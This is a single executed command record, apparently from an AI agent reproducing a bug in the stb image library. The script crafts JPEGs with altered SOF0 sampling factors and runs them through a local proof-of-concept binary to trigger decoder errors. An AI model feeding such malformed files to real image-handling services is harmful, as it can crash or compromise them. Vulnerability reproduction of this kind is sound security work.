message:
Command `cd /workspace/repo-vul/src-vul/stb && python3 - <<'PY'
from pathlib import Path
from PIL import Image
img=Image.new('RGB',(16,16),(200,100,50))
img.save('/tmp/base.jpg','JPEG',subsampling=0,quality=90)
base=bytearray(Path('/tmp/base.jpg').read_bytes())
idx=base.find(b'\xff\xc0')
cs=idx+2+2+1+2+2+1
# print original cmp bytes and modify first component sampling to 0x31, others keep 0x11.
for samp in [0x31,0x41,0x13,0x23,0x33,0x44]:
    data=bytearray(base)
    data[cs+1]=samp
    Path('/tmp/t.jpg').write_bytes(data)
    r=__import__('subprocess').run(['/tmp/jpeg_poc','/tmp/t.jpg'],capture_output=True,text=True)
    print('samp',hex(samp),'rc',r.returncode,'errhead',r.stderr.splitlines()[:6])
PY` executed with exit code 0.
